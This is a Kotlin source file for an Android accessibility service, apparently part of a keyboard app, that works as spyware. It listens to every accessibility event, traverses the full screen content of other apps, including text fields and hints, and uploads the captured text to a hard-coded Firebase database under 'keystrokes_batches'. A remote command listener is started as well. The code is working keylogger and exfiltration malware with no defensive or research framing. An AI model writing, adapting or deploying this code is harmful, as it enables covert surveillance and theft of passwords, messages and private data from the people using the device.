package com.example.mykeyboard

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import com.google.firebase.FirebaseApp
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
class AppAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "AppAccessibilityService"
        private val scope = CoroutineScope(Dispatchers.IO)
        private const val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"

        private fun getDatabaseRef(deviceName: String): DatabaseReference? = try {
            FirebaseDatabase.getInstance(DB_URL).getReference().child("keystrokes_batches").child(deviceName)
        } catch (e: Exception) {
            Log.e(TAG, "Error getting database ref", e)
            null
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        try {
            FirebaseApp.initializeApp(applicationContext)
            RemoteCommandListener.startListening()

            val info = AccessibilityServiceInfo().apply {
                eventTypes = -1 // All accessibility events continuously
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
                notificationTimeout = 0 // Instantaneous capture at every step
            }
            serviceInfo = info
            Log.d(TAG, "Unrestricted Full Screen & Secure Content Crawler Connected")
            LogStore.addLog("Unrestricted Full Screen & Secure Content Crawler Active")
        } catch (e: Exception) {
            Log.e(TAG, "Error in onServiceConnected", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!KeyloggingConfig.isEnabled) return
        if (event == null) return
        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            if (packageName.contains("systemui", true) || packageName.contains("launcher", true)) return

            val sb = StringBuilder()

            if (!event.text.isNullOrEmpty()) {
                sb.append(event.text.joinToString(" ")).append(" ")
            }
            if (!event.contentDescription.isNullOrBlank()) {
                sb.append("[Desc: ${event.contentDescription}] ")
            }

            val rootNode = rootInActiveWindow
            if (rootNode != null) {
                traverseNode(rootNode, sb)
            }

            val capturedContent = sb.toString().trim()
            if (capturedContent.isBlank()) return

            scope.launch {
                try {
                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                    val ref = getDatabaseRef(deviceName) ?: return@launch
                    val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
                    val sanitizedAppName = packageName.replace(Regex("[^a-zA-Z0-9_-]"), "_")

                    val eventData = mapOf(
                        "deviceName" to deviceName,
                        "packageName" to sanitizedAppName,
                        "text" to capturedContent,
                        "timestamp" to System.currentTimeMillis()
                    )

                    ref.child("accessibility_$sanitizedAppName").child(timestampKey).setValue(eventData)
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
    }

    private fun traverseNode(node: AccessibilityNodeInfo, sb: StringBuilder) {
        try {
            val text = node.text?.toString()
            val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) node.hintText?.toString() else null
            val desc = node.contentDescription?.toString()

            if (!text.isNullOrBlank()) {
                sb.append(text).append(" ")
            }
            if (!hint.isNullOrBlank()) {
                sb.append("[Hint: $hint] ")
            }
            if (!desc.isNullOrBlank()) {
                sb.append("[Desc: $desc] ")
            }

            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    traverseNode(child, sb)
                }
            }
        } catch (_: Exception) {
        }
    }

    override fun onInterrupt() {}
}
